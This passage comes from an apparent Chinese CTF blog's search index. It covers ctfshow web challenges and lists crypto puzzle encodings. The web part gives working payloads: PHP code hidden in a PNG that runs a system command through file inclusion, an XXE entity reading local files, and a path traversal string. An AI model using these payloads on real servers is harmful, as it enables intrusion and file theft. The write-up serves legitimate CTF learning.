<p>api.php对action进行传参，即url/api.php?action=，upload是上传文件，include是包含文件</p>
<p>可以查看源码:只能上传jpeg和png图片，并且会对内容进行检查，内容不能含有php|include|require|get|post|request</p>
<ol start="4">
<li>先上传一个png图片，里面嵌入php代码，然后进行上传</li>
</ol>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">&quot;cat ./F*&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后对上传的文件进行包含吗，即可得到flag</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">GET：url/api.php?action=<span class="keyword">include</span></span><br><span class="line">POST: filename=<span class="regexp">/var/</span>www<span class="regexp">/html/u</span>pload/a.png</span><br></pre></td></tr></table></figure>


<p>注：include 会执行包含的任意格式文件里的php代码</p>
<h2 id="web836"><a href="#web836" class="headerlink" title="web836"></a>web836</h2><p>二次报错注入</p>
<p><img src="https://img.npfs06.top/20231123140401.png"></p>
<h2 id="web837"><a href="#web837" class="headerlink" title="web837"></a>web837</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mytest</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configs</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">config</span> <span class="attr">name</span>=<span class="string">&quot;shutdown&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">path</span>&gt;</span>/usr/local/bin<span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">execute</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">execute</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">args</span>&gt;</span>-clear<span class="tag">&lt;/<span class="name">args</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configs</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="web838"><a href="#web838" class="headerlink" title="web838"></a>web838</h2><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/file/</span>download?<span class="keyword">file</span>=..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>../flag</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web入门</category>
      </categories>
  </entry>
  <entry>
    <title>ctfshow-crypto</title>
    <url>/2023/11/24/ctfshow-crypto/</url>
    <content><![CDATA[<h2 id="crypto2"><a href="#crypto2" class="headerlink" title="crypto2"></a>crypto2</h2><p>jsfuck</p>
<p><img src="https://img.npfs06.top/20231124091004.png"></p>
<h2 id="crypto3"><a href="#crypto3" class="headerlink" title="crypto3"></a>crypto3</h2><p>颜文字</p>
<h2 id="crypto4"><a href="#crypto4" class="headerlink" title="crypto4"></a>crypto4</h2><p><img src="https://img.npfs06.top/20231124091921.png"></p>
<h2 id="crypto5"><a href="#crypto5" class="headerlink" title="crypto5"></a>crypto5</h2><p>17转16进制是11</p>
<p><img src="https://img.npfs06.top/20231124094604.png"></p>
<h2 id="crypto6"><a href="#crypto6" class="headerlink" title="crypto6"></a>crypto6</h2><p>Rabbit</p>
<p><img src="https://img.npfs06.top/20231124094941.png"></p>
<h2 id="crypto7"><a href="#crypto7" class="headerlink" title="crypto7"></a>crypto7</h2><p>ook</p>
<h2 id="crypto8"><a href="#crypto8" class="headerlink" title="crypto8"></a>crypto8</h2><p>Brainfuck</p>
<h2 id="crypto9"><a href="#crypto9" class="headerlink" title="crypto9"></a>crypto9</h2><p><img src="https://img.npfs06.top/20231124095408.png"></p>
<p>serpent</p>
<p><img src="https://img.npfs06.top/20231124095708.png"></p>
]]></content>
      <categories>
        <category>web入门</category>
        <category>Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>CTF 常见密码编码及其特征汇总</title>
    <url>/2023/11/24/CTF-%E5%B8%B8%E8%A7%81%E5%AF%86%E7%A0%81%E7%BC%96%E7%A0%81%E5%8F%8A%E5%85%B6%E7%89%B9%E5%BE%81%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="d8f380e3a09e4fa19cca681e9bed91536de660f762859e9dcd545de5428261e2"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
  </entry>
</search>
